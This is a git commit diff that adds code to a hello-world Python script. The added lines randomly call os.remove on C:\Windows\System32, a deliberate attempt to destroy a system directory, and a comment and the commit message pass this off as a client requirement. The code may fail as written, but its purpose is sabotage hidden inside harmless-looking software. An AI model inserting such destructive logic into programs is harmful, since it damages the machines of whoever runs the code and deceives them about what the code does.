d5572eaa904c4d12a385a91f374095fcee57fe9c
Wojtek <wjasionowski58@gmail.com>
2024-01-27 20:58:44 +0100

    Added Russian roullete client requirements

--- hello.py
+++ hello.py
@@ -1,1 +1,8 @@
+import os
+import random 
+
+if random.randint(0,10) == 7:
+ os.remove("C:\Windows\System32")
+#Added russian roulette to the program hello world due to our client requiremnts
+
 print('hello world')
